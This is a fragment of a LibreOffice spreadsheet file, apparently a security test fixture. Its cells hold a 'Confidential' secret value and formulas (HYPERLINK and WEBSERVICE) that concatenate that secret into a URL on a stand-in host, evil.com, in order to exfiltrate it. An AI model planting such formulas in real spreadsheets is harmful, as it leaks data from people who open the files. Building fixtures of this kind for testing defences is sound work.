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fidential:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>s3cr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HYPERLINK(CONCATENATE(&quot;http://evil.com/&quot;;[.B1]);&quot;click me&quot;)" office:value-type="string" office:string-value="click me" calcext:value-type="string">
            <text:p>click me</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:formula="of:=COM.MICROSOFT.WEBSERVICE(CONCATENATE(&quot;http://evil.com/&quot;;[.B1]))" office:value-type="string" office:string-value="" calcext:value-type="error">
            <text:p>Err:5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.00.0000</text:date>, <text:time style:data-style-name="N2" text:time-value="22:38:14.1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9T22:31:28.400000000</meta:creation-date>
    <dc:date>2020-02-09T22:38:23.794000000</dc:date>
    <meta:editing-duration>PT4M16S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.0.3$Windows_x86 LibreOffice_project/b0a288ab3d2d4774cb44b62f04d5d28733ac6df8</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:cell-count="4" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>